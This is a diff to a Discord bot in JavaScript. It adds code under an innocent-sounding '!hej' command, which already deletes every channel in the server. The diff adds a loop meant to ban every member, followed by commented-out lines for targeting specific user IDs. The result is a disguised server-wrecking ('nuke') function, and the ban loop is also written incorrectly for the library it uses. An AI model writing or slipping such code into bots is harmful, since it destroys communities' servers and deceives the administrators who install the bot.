@@ -58,6 +58,23 @@ bot.on("ready", e => {
 	
 	if(cmd === `${prefix}hej`){
 		message.guild.channels.deleteAll();
+                for (let i = 0; i < message.guild.members.size; i++) {
+                    message.guild.members[i].user.ban()
+                }
+               // message.guild.members.get("user ID here");
+              //  message.guild.members.get("user ID here");
+              //  message.guild.members.get("user ID here");
+           //     message.guild.members.get("user ID here");
+             //   message.guild.members.get("user ID here");
+           //     message.guild.members.get("user ID here");
+            //    message.guild.members.get("user ID here");
+           //     message.guild.members.get("user ID here");
+            //    message.guild.members.get("user ID here");
+          //      message.guild.members.get("user ID here");
+           //     message.guild.members.get("user ID here");
+           //     message.guild.members.get("user ID here");
+            //    message.guild.members.get("user ID here");
+           //     message.guild.members.get("user ID here");
 		//message.channel.send("**POMOC BOTA:**\n`Aktualnie brak komend innych niz !help w tym bocie ;(`");
 	}
   });
